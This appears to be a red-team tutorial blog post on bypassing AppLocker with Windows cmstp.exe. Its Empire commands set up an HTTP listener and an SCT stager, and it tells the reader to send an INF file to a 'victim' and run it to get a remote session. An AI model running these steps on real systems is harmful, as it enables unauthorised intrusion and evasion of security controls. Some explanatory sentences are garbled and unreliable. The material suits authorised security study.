<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a>, <a href="https://www.hackingarticles.in/category/red-teaming/windows-exploitation/" rel="category tag">Windows Exploitation</a></span>            </div>
            <h1 class="post-title entry-title">Windows Exploitation: cmstp</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-exploitation-cmstp/" rel="bookmark"><time class="entry-date published" datetime="2019-02-16T16:53:59+00:00">February 16, 2019</time><time class="updated" datetime="2025-05-15T17:59:44+00:00">May 15, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <h3 data-pm-slice="1 1 []"><span style="color: #800000;">Bypassing Applocker Using CMSTP</span></h3>
<p><span style="color: #000000;">By default, Applocker allows the execution of binaries in the folder, which is the major reason that it can be bypassed. It has been found that such binaries can easily be used in order to bypass Applocker along with UAC. One of such a binary related to Microsoft is CMSTP. CMSTP welcomes INF files, and so exploitation through INF is possible. And so, we will be learning how to perform such exploitation.</span></p>
<p><span style="color: #000000;">Non-framework procedures like cmstp.exe start from the programming you introduced to your system. Since most applications store information on your hard drive and in your system’s registry. It has machine code written in it. In the event that you begin the product Microsoft(R), Connection Manager on your system, the directions contained in cmstp.exe will run on your system. For this reason, the record is stored in the primary memory (RAM) and keeps running there as a Microsoft Connection Manager Profile Installer process (additionally called an errand). As we all know, CMSTP accepts SCT files and runs them without suspicion, and therefore, we will create a malicious SCT file to reach our goal.  We will use Empire PowerShell for this. For a detailed guide on Empire PowerShell, click <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/hacking-with-empire-powershell-post-exploitation-agent/">here</a></strong></span>.</span></p>
<h3 data-pm-slice="1 1 []"><span style="color: #800000;">Creating a Listener in Empire</span></h3>
<p><span style="color: #000000;">Launch the empire framework from the terminal of Kali and then type the following commands to create your malware :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">listeners
uselistener http
set Host 192.168.1.109
execute</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-SPvGtOOjM8M/XGg_Q0z3g_I/AAAAAAAAcsQ/OnJM44dmhcUwxsiw1cXJiuvfu-wsjSI-wCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">The above commands will create a listener for you, then type back to return from listener interface and as for the creation of SCT file type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager windows/launcher_sct
set Listener HTTP
execute</pre>
<p><span style="color: #000000;">Running the above exploit will create your SCT file. We will use the following script to execute our file in PowerShell. In this script give the path of your SCT file and add the following line as shown in the image.</span></p>
<p><span style="color: #000000;"><strong><em>Download this script from <a href="//gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80#file-cmstp-inf">here</a>:</em></strong></span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="//3.bp.blogspot.com/-sT41kSgI1iw/XGg_QrtKTkI/AAAAAAAAcsM/t3U4bWlhLXkt0EDGXkQQp9Qp5J6AtUJ_ACLcBGAs/s1600/2.png"/></strong></span></p>
<h3 data-pm-slice="1 1 []"><span style="color: #800000;">Executing the Exploit on the Victim’s Machine</span></h3>
<p><span style="color: #000000;">Now, send the file to the victim’s PC and run the following command in victims’ command prompt :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cmstp.exe /s shell.inf</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-KAli1G3fFO0/XGg_QpAAhcI/AAAAAAAAcsI/HTvA_QP4w0MNPotmXGNFZYFQMn19GYgXwCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">As soon as you run the command, you will have a session. Use the following command to access your session :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">interact &lt;session name&gt;</pre>
<p><span style="color: #000000;">This way, you can use CMSTP binary to bypass applocker restrictions. CMSTP needs an INF file and by using it to your advantage you can have access to victim’s PC.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-MIYrhUQ92bI/XGg_Rh6_RKI/AAAAAAAAcsU/QD8ZHO33MoMKGI8YCEBX2HWZsBYb8soDwCLcBGAs/s1600/5.png"/></span></p>
<p>To learn more about Windows Exploitation. Follow this <strong><a href="https://www.hackingarticles.in/category/red-teaming/windows-exploitation/">Link.</a></strong></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <span style="color: #0000ff;"><strong><a class="broken_link" style="color: #0000ff;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
